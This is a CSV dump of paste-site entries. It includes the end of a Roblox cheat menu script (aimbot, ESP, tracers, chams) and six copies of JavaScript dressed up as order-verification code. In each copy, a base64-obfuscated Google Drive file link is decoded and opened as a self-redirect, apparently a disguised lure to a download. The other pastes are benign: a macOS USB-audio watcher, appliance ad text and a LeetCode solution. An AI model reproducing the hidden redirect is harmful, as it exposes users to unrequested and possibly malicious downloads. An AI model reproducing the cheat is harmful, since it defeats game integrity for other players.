id,title,username,language,date,content
	end
})

AimbotFOVSection:Slider({
	Name = ""Transparency"",
	Flag = ""Aimbot_FOV_Transparency"",
	Default = Aimbot_FOV.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		Aimbot_FOV.Transparency = Value / 10
	end
})

AimbotFOVSection:Slider({
	Name = ""Thickness"",
	Flag = ""Aimbot_FOV_Thickness"",
	Default = Aimbot_FOV.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		Aimbot_FOV.Thickness = Value
	end
})

--// ESP Tab

local ESP_Properties_Section = _ESP:Section({
	Name = ""ESP Properties"",
	Side = ""Left""
})

AddValues(ESP_Properties_Section, ESP_Properties.ESP, {}, ""ESP_Propreties_"")

ESP_Properties_Section:Dropdown({
	Name = ""Text Font"",
	Flag = ""ESP_TextFont"",
	Content = Fonts,
	Default = Fonts[ESP_Properties.ESP.Font + 1],
	Callback = function(Value)
		ESP_Properties.ESP.Font = Drawing.Fonts[Value]
	end
})

ESP_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""ESP_TextTransparency"",
	Default = ESP_Properties.ESP.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.ESP.Transparency = Value / 10
	end
})

ESP_Properties_Section:Slider({
	Name = ""Font Size"",
	Flag = ""ESP_FontSize"",
	Default = ESP_Properties.ESP.Size,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		ESP_Properties.ESP.Size = Value
	end
})

ESP_Properties_Section:Slider({
	Name = ""Offset"",
	Flag = ""ESP_Offset"",
	Default = ESP_Properties.ESP.Offset,
	Min = 10,
	Max = 30,
	Callback = function(Value)
		ESP_Properties.ESP.Offset = Value
	end
})

local Tracer_Properties_Section = _ESP:Section({
	Name = ""Tracer Properties"",
	Side = ""Right""
})

AddValues(Tracer_Properties_Section, ESP_Properties.Tracer, {}, ""Tracer_Properties_"")

Tracer_Properties_Section:Dropdown({
	Name = ""Position"",
	Flag = ""Tracer_Position"",
	Content = TracerPositions,
	Default = TracerPositions[ESP_Properties.Tracer.Position],
	Callback = function(Value)
		ESP_Properties.Tracer.Position = tablefind(TracerPositions, Value)
	end
})

Tracer_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Tracer_Transparency"",
	Default = ESP_Properties.Tracer.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Tracer.Transparency = Value / 10
	end
})

Tracer_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Tracer_Thickness"",
	Default = ESP_Properties.Tracer.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Tracer.Thickness = Value
	end
})

local HeadDot_Properties_Section = _ESP:Section({
	Name = ""Head Dot Properties"",
	Side = ""Left""
})

AddValues(HeadDot_Properties_Section, ESP_Properties.HeadDot, {}, ""HeadDot_Properties_"")

HeadDot_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""HeadDot_Transparency"",
	Default = ESP_Properties.HeadDot.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.HeadDot.Transparency = Value / 10
	end
})

HeadDot_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""HeadDot_Thickness"",
	Default = ESP_Properties.HeadDot.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.HeadDot.Thickness = Value
	end
})

HeadDot_Properties_Section:Slider({
	Name = ""Sides"",
	Flag = ""HeadDot_Sides"",
	Default = ESP_Properties.HeadDot.NumSides,
	Min = 3,
	Max = 30,
	Callback = function(Value)
		ESP_Properties.HeadDot.NumSides = Value
	end
})

local Box_Properties_Section = _ESP:Section({
	Name = ""Box Properties"",
	Side = ""Left""
})

AddValues(Box_Properties_Section, ESP_Properties.Box, {}, ""Box_Properties_"")

Box_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Box_Transparency"",
	Default = ESP_Properties.Box.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Box.Transparency = Value / 10
	end
})

Box_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Box_Thickness"",
	Default = ESP_Properties.Box.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Box.Thickness = Value
	end
})

local HealthBar_Properties_Section = _ESP:Section({
	Name = ""Health Bar Properties"",
	Side = ""Right""
})

AddValues(HealthBar_Properties_Section, ESP_Properties.HealthBar, {}, ""HealthBar_Properties_"")

HealthBar_Properties_Section:Dropdown({
	Name = ""Position"",
	Flag = ""HealthBar_Position"",
	Content = HealthBarPositions,
	Default = HealthBarPositions[ESP_Properties.HealthBar.Position],
	Callback = function(Value)
		ESP_Properties.HealthBar.Position = tablefind(HealthBarPositions, Value)
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""HealthBar_Transparency"",
	Default = ESP_Properties.HealthBar.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.HealthBar.Transparency = Value / 10
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""HealthBar_Thickness"",
	Default = ESP_Properties.HealthBar.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.HealthBar.Thickness = Value
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Offset"",
	Flag = ""HealthBar_Offset"",
	Default = ESP_Properties.HealthBar.Offset,
	Min = 4,
	Max = 12,
	Callback = function(Value)
		ESP_Properties.HealthBar.Offset = Value
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Blue"",
	Flag = ""HealthBar_Blue"",
	Default = ESP_Properties.HealthBar.Blue,
	Min = 0,
	Max = 255,
	Callback = function(Value)
		ESP_Properties.HealthBar.Blue = Value
	end
})

local Chams_Properties_Section = _ESP:Section({
	Name = ""Chams Properties"",
	Side = ""Right""
})

AddValues(Chams_Properties_Section, ESP_Properties.Chams, {}, ""Chams_Properties_"")

Chams_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Chams_Transparency"",
	Default = ESP_Properties.Chams.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Chams.Transparency = Value / 10
	end
})

Chams_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Chams_Thickness"",
	Default = ESP_Properties.Chams.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Chams.Thickness = Value
	end
})

--// Crosshair Tab

local Crosshair_Settings = _Crosshair:Section({
	Name = ""Crosshair Settings (1 / 2)"",
	Side = ""Left""
})

Crosshair_Settings:Toggle({
	Name = ""Enabled"",
	Flag = ""Crosshair_Enabled"",
	Default = Crosshair.Enabled,
	Callback = function(Value)
		Crosshair.Enabled = Value
	end
})

Crosshair_Settings:Toggle({
	Name = ""Enable ROBLOX Cursor"",
	Flag = ""Cursor_Enabled"",
	Default = UserInputService.MouseIconEnabled,
	Callback = SetMouseIconVisibility
})

AddValues(Crosshair_Settings, Crosshair, {""Enabled""}, ""Crosshair_"")

Crosshair_Settings:Dropdown({
	Name = ""Position"",
	Flag = ""Crosshair_Position"",
	Content = {""Mouse"", ""Center""},
	Default = ({""Mouse"", ""Center""})[Crosshair.Position],
	Callback = function(Value)
		Crosshair.Position = Value == ""Mouse"" and 1 or 2
	end
})

Crosshair_Settings:Slider({
	Name = ""Size"",
	Flag = ""Crosshair_Size"",
	Default = Crosshair.Size,
	Min = 1,
	Max = 24,
	Callback = function(Value)
		Crosshair.Size = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Gap Size"",
	Flag = ""Crosshair_GapSize"",
	Default = Crosshair.GapSize,
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.GapSize = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Rotation (Degrees)"",
	Flag = ""Crosshair_Rotation"",
	Default = Crosshair.Rotation,
	Min = -180,
	Max = 180,
	Callback = function(Value)
		Crosshair.Rotation = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Rotation Speed"",
	Flag = ""Crosshair_RotationSpeed"",
	Default = Crosshair.RotationSpeed,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		Crosshair.RotationSpeed = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Pulsing Step"",
	Flag = ""Crosshair_PulsingStep"",
	Default = Crosshair.PulsingStep,
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingStep = Value
	end
})

local _Crosshair_Settings = _Crosshair:Section({
	Name = ""Crosshair Settings (2 / 2)"",
	Side = ""Left""
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Speed"",
	Flag = ""Crosshair_PulsingSpeed"",
	Default = Crosshair.PulsingSpeed,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		Crosshair.PulsingSpeed = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Boundary (Min)"",
	Flag = ""Crosshair_Pulse_Min"",
	Default = Crosshair.PulsingBounds[1],
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingBounds[1] = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Boundary (Max)"",
	Flag = ""Crosshair_Pulse_Max"",
	Default = Crosshair.PulsingBounds[2],
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingBounds[2] = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Transparency"",
	Flag = ""Crosshair_Transparency"",
	Default = Crosshair.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		Crosshair.Transparency = Value / 10
	end
})

_Crosshair_Settings:Slider({
	Name = ""Thickness"",
	Flag = ""Crosshair_Thickness"",
	Default = Crosshair.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		Crosshair.Thickness = Value
	end
})

local Crosshair_CenterDot = _Crosshair:Section({
	Name = ""Center Dot Settings"",
	Side = ""Right""
})

Crosshair_CenterDot:Toggle({
	Name = ""Enabled"",
	Flag = ""Crosshair_CenterDot_Enabled"",
	Default = CenterDot.Enabled,
	Callback = function(Value)
		CenterDot.Enabled = Value
	end
})

AddValues(Crosshair_CenterDot, CenterDot, {""Enabled""}, ""Crosshair_CenterDot_"")

Crosshair_CenterDot:Slider({
	Name = ""Size / Radius"",
	Flag = ""Crosshair_CenterDot_Radius"",
	Default = CenterDot.Radius,
	Min = 2,
	Max = 8,
	Callback = function(Value)
		CenterDot.Radius = Value
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Sides"",
	Flag = ""Crosshair_CenterDot_Sides"",
	Default = CenterDot.NumSides,
	Min = 3,
	Max = 30,
	Callback = function(Value)
		CenterDot.NumSides = Value
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Transparency"",
	Flag = ""Crosshair_CenterDot_Transparency"",
	Default = CenterDot.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		CenterDot.Transparency = Value / 10
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Thickness"",
	Flag = ""Crosshair_CenterDot_Thickness"",
	Default = CenterDot.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		CenterDot.Thickness = Value
	end
})

--// Settings Tab

local SettingsSection = Settings:Section({
	Name = ""Settings"",
	Side = ""Left""
})

local ProfilesSection = Settings:Section({
	Name = ""Profiles"",
	Side = ""Left""
})

local InformationSection = Settings:Section({
	Name = ""Information"",
	Side = ""Right""
})

SettingsSection:Keybind({
	Name = ""Show / Hide GUI"",
	Flag = ""UI Toggle"",
	Default = Enum.KeyCode.RightShift,
	Blacklist = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2, Enum.UserInputType.MouseButton3},
	Callback = function(_, NewKeybind)
		if not NewKeybind then
			GUI:Close()
		end
	end
})

SettingsSection:Button({
	Name = ""Unload Script"",
	Callback = function()
		GUI:Unload()
		ESP:Exit()
		Aimbot:Exit()
		getgenv().AirHubV2Loaded = nil
	end
})

local ConfigList = ProfilesSection:Dropdown({
	Name = ""Configurations"",
	Flag = ""Config Dropdown"",
	Content = GUI:GetConfigs()
})

ProfilesSection:Box({
	Name = ""Configuration Name"",
	Flag = ""Config Name"",
	Placeholder = ""Config Name""
})

ProfilesSection:Button({
	Name = ""Load Configuration"",
	Callback = function()
		GUI:LoadConfig(GUI.flags[""Config Dropdown""])
	end
})

ProfilesSection:Button({
	Name = ""Delete Configuration"",
	Callback = function()
		GUI:DeleteConfig(GUI.flags[""Config Dropdown""])
		ConfigList:Refresh(GUI:GetConfigs())
	end
})

ProfilesSection:Button({
	Name = ""Save Configuration"",
	Callback = function()
		GUI:SaveConfig(GUI.flags[""Config Dropdown""] or GUI.flags[""Config Name""])
		ConfigList:Refresh(GUI:GetConfigs())
	end
})

InformationSection:Label(""Made by Exunys"")

InformationSection:Button({
	Name = ""Copy GitHub"",
	Callback = function()
		setclipboard(""https://github.com/Exunys"")
	end
})

InformationSection:Label(""AirTeam © 2022 - ""..osdate(""%Y""))

InformationSection:Button({
	Name = ""Copy Discord Invite"",
	Callback = function()
		setclipboard(""https://discord.gg/Ncz3H3quUZ"")
	end
})

--[=[
local MiscellaneousSection = Settings:Section({
	Name = ""Miscellaneous"",
	Side = ""Right""
})

local TimeLabel = MiscellaneousSection:Label(""..."")
local FPSLabel = MiscellaneousSection:Label(""..."")
local PlayersLabel = MiscellaneousSection:Label(""..."")

MiscellaneousSection:Button({
	Name = ""Rejoin"",
	Callback = Rejoin
})

delay(2, function()
	spawn(function()
		while wait(1) do
			TimeLabel:Set(osdate(""%c""))
			PlayersLabel:Set(#Players:GetPlayers())
		end
	end)

	RunService.RenderStepped:Connect(function(FPS)
		FPSLabel:Set(""FPS: ""..mathfloor(1 / FPS))
	end)
end)
]=]

--//

ESP.Load()
Aimbot.Load()
getgenv().AirHubV2Loaded = true
getgenv().AirHubV2Loading = nil

GeneralSignal:Fire()
GUI:Close()"
hK0F2bjz,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 08:38:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W3nHSi85,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 08:23:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k1ZxB08q,usb-log-watcher.sh,muttmutt,Bash,Sunday 6th of April 2025 08:09:09 PM CDT,"#!/bin/bash

PLUGGED=""enumerated 0x05ac/110c/b817 (AirPods Max USB Audio / 1)""
UNPLUGGED=""(AirPods Max USB Audio): hardware connection lost""
IDENTIFIER=""AirPods Max""

PREVIOUS_STATE=""disconnected""

log stream --predicate 'eventMessage contains ""USB""' --info | while read -r line; do
  if echo ""$line"" | grep -q ""$IDENTIFIER""; then
    if echo ""$line"" | grep -iq ""$PLUGGED""; then
      if [ ""$PREVIOUS_STATE"" != ""connected"" ]; then
        #echo ""[$(date)] AirPods Max connected – quitting SoundSource""
        osascript -e 'tell application ""SoundSource"" to quit'
        osascript -e 'display notification ""AirPods Max connected – SoundSource quit"" with title ""USB Audio Event""'
        PREVIOUS_STATE=""connected""
      fi
    elif echo ""$line"" | grep -iq ""$UNPLUGGED""; then
      if [ ""$PREVIOUS_STATE"" != ""disconnected"" ]; then
        #echo ""[$(date)] AirPods Max disconnected – launching SoundSource""
        osascript -e 'tell application ""SoundSource"" to activate'
        osascript -e 'display notification ""AirPods Max disconnected – SoundSource started"" with title ""USB Audio Event""'
        PREVIOUS_STATE=""disconnected""
      fi
    fi
  fi
done
"
irfQKWgX,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 08:07:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51934/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
x4HFSuA2,Panasonic Inverter Refrigerator,westernappstalucia,HTML,Sunday 6th of April 2025 07:58:14 PM CDT,"Panasonic inverter refrigerators combine advanced technology with energy efficiency, making them an excellent choice for modern homes. Their inverter technology allows the compressor to adjust its speed based on cooling demand, ensuring consistent temperature control while consuming less energy. This results in lower electricity bills and a more sustainable appliance that operates quietly and efficiently. Panasonic's refrigerators are also designed with premium features, such as spacious compartments, adjustable shelves, and powerful cooling systems, keeping your food fresh for longer.

Beyond efficiency, Panasonic refrigerators are built for convenience and durability. They feature advanced storage solutions, antibacterial coatings, and intelligent humidity control, ensuring that fruits, vegetables, and other perishables stay fresh for extended periods. With a sleek and modern design, these refrigerators complement any kitchen setup, providing both style and functionality. Additionally, Panasonic offers various sizes and models, catering to different household needs.

Investing in a Panasonic inverter refrigerator means prioritizing both energy savings and long-term reliability. Explore the range of models available and experience the benefits of cutting-edge cooling technology.

Upgrade to a Panasonic inverter refrigerator today and enjoy energy-efficient cooling. Explore your options here! For more information, read more on <a href=""https://western.com.ph/blog/panasonic-inverter-refrigerator-philippines/"">Panasonic Inverter Refrigerator</a>."
a2nNr40a,Market.js,zebmekey,JavaScript,Sunday 6th of April 2025 07:52:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78156/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BXmPzxrm,Untitled,smj007,Python,Sunday 6th of April 2025 07:40:31 PM CDT,"TC - O(n)
SC - O(1)

class Solution:
    def productExceptSelf(self, nums: List[int]) -> List[int]:
        
        product = [1]*len(nums)

        # do a forward pass and accumulate the answers
        for i in range(1, len(nums)):
            product[i] = product[i-1]*nums[i-1]

        reverse_cum_product = 1
        # do a backward pass and accumulate the answers again
        for i in range(len(nums)-1, -1, -1):
            product[i] = product[i]*reverse_cum_product
            reverse_cum_product *= nums[i]

        return product"
gEcvY63r,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 07:36:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89311/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QWxsExiC,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 07:21:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28361/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
